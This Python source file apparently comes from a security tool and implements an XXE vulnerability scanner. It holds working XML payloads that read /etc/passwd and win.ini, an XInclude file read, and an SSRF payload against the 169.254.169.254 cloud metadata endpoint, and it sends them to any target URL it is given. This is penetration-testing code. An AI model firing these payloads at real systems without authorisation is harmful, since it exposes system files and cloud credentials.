"""tools/xxe_scanner.py — XML External Entity (XXE) Scanner.

Detects XXE vulnerabilities by injecting external entity definitions
that read local files or trigger outbound requests. Tests:
- Basic XXE (file read)
- Blind XXE (out-of-band)
- Error-based XXE
- XInclude attacks

Public API:
    XXEScanner - Main scanner class
    XXEResult - Result of a single test
    XXEScanResult - Full scan results
"""

from __future__ import annotations

import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("elengenix.xxe_scanner")


@dataclass
class XXEResult:
    """Result of a single XXE test."""

    url: str
    payload_type: str
    payload: str
    vulnerable: bool
    evidence: str = ""
    file_content: str = ""
    severity: str = "High"
    confidence: float = 0.0


@dataclass
class XXEScanResult:
    """Full XXE scan results."""

    target: str
    results: List[XXEResult] = field(default_factory=list)
    total_tests: int = 0
    duration: float = 0.0

    @property
    def is_vulnerable(self) -> bool:
        return any(r.vulnerable for r in self.results)

    def summary(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "vulnerable": self.is_vulnerable,
            "total_findings": len([r for r in self.results if r.vulnerable]),
            "total_tests": self.total_tests,
            "duration": self.duration,
        }


# XXE payloads
XXE_PAYLOADS = [
    # Basic XXE - read /etc/passwd
    (
        "basic_file_read",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "root:",
        "Basic XXE file read",
    ),
    # Basic XXE - read /etc/hostname
    (
        "hostname_read",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        "",
        "Hostname read",
    ),
    # Windows XXE
    (
        "windows_file_read",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "[fonts]",
        "Windows file read",
    ),
    # Blind XXE via error
    (
        "error_based",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>',
        "No such file",
        "Error-based XXE",
    ),
    # XInclude attack
    (
        "xinclude",
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        "root:",
        "XInclude file read",
    ),
    # SSRF via XXE
    (
        "ssrf",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "ami-id",
        "SSRF via XXE",
    ),
    # Parameter entity
    (
        "parameter_entity",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
        "root:",
        "Parameter entity XXE",
    ),
]

# Content types that might accept XML
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/rss+xml",
    "application/atom+xml",
    "application/vnd.sun.xml.calc",
    "application/vnd.sun.xml.writer",
]


class XXEScanner:
    """XXE vulnerability scanner.

    Tests input endpoints for XML External Entity injection by
    sending payloads that attempt to read local files or trigger
    outbound requests.

    Example:
        scanner = XXEScanner()
        result = scanner.scan("https://example.com/api/xml")
        if result.is_vulnerable:
            print("XXE vulnerability found!")
    """

    def __init__(
        self,
        timeout: float = 10.0,
        verify_ssl: bool = False,
    ):
        """Initialize the XXE scanner.

        Args:
            timeout: Request timeout in seconds.
            verify_ssl: Whether to verify SSL certificates.
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl

    def scan(
        self,
        target_url: str,
        method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
    ) -> XXEScanResult:
        """Scan a URL for XXE vulnerabilities.

        Args:
            target_url: The URL to test.
            method: HTTP method to use.
            headers: Additional headers to send.

        Returns:
            XXEScanResult with all test results.
        """
        import requests

        start_time = time.time()
        result = XXEScanResult(target=target_url)

        default_headers = {
            "Content-Type": "application/xml",
            "User-Agent": "Elengenix-XXE-Scanner/1.0",
        }
        if headers:
            default_headers.update(headers)

        # Test each payload
        for payload_type, payload, expected, description in XXE_PAYLOADS:
            result.total_tests += 1

            try:
                response = requests.request(
                    method=method,
                    url=target_url,
                    data=payload,
                    headers=default_headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )

                response_text = response.text[:10000]

                # Check for evidence
                if expected and expected in response_text:
                    # Extract the file content if possible
                    file_content = ""
                    if "root:" in response_text:
                        # Try to extract passwd content
                        match = re.search(r"root:.*?(\n|$)", response_text)
                        if match:
                            file_content = match.group(0)

                    xxe_result = XXEResult(
                        url=target_url,
                        payload_type=payload_type,
                        payload=payload,
                        vulnerable=True,
                        evidence=f"Response contains '{expected}' - {description}",
                        file_content=file_content,
                        severity="High",
                        confidence=0.9,
                    )
                    result.results.append(xxe_result)
                    logger.info(f"XXE found: {description}")

                # Check for error messages that indicate XXE processing
                error_patterns = [
                    r"xml parsing error",
                    r"xmlparser",
                    r"entity.*not defined",
                    r"external entity",
                ]
                for pattern in error_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        logger.debug(f"XXE error pattern detected: {pattern}")
                        break

            except requests.exceptions.Timeout:
                logger.debug(f"Timeout for {payload_type}")
            except Exception as e:
                logger.debug(f"Error testing {payload_type}: {e}")

        result.duration = time.time() - start_time
        return result

    def scan_json_endpoint(
        self,
        target_url: str,
        json_data: Dict[str, Any],
    ) -> XXEScanResult:
        """Test if a JSON endpoint accepts XML input.

        Some endpoints accept both JSON and XML. This method tests
        if switching to XML input enables XXE.

        Args:
            target_url: The URL to test.
            json_data: Sample JSON data to convert to XML.

        Returns:
            XXEScanResult with all test results.
        """
        import requests

        start_time = time.time()
        result = XXEScanResult(target=target_url)

        # Convert JSON to simple XML
        def json_to_xml(data: Any, root_tag: str = "root") -> str:
            xml = f'<?xml version="1.0" encoding="UTF-8"?><{root_tag}>'
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, (dict, list)):
                        xml += json_to_xml(value, key)
                    else:
                        xml += f"<{key}>{value}</{key}>"
            elif isinstance(data, list):
                for item in data:
                    xml += json_to_xml(item, "item")
            else:
                xml += str(data)
            xml += f"</{root_tag}>"
            return xml

        # Test with content-type override
        content_types = [
            "application/xml",
            "text/xml",
            "application/soap+xml",
        ]

        for content_type in content_types:
            for payload_type, payload, expected, description in XXE_PAYLOADS[:3]:  # Test first 3
                result.total_tests += 1

                try:
                    response = requests.post(
                        target_url,
                        data=payload,
                        headers={
                            "Content-Type": content_type,
                            "User-Agent": "Elengenix-XXE-Scanner/1.0",
                        },
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                    )

                    response_text = response.text[:10000]

                    if expected and expected in response_text:
                        xxe_result = XXEResult(
                            url=target_url,
                            payload_type=f"{payload_type}_via_{content_type}",
                            payload=payload,
                            vulnerable=True,
                            evidence=f"Content-Type {content_type} accepted XXE",
                            severity="High",
                            confidence=0.85,
                        )
                        result.results.append(xxe_result)
                        logger.info(f"XXE found via {content_type}")
                        break

                except Exception as e:
                    logger.debug(f"Error: {e}")

        result.duration = time.time() - start_time
        return result
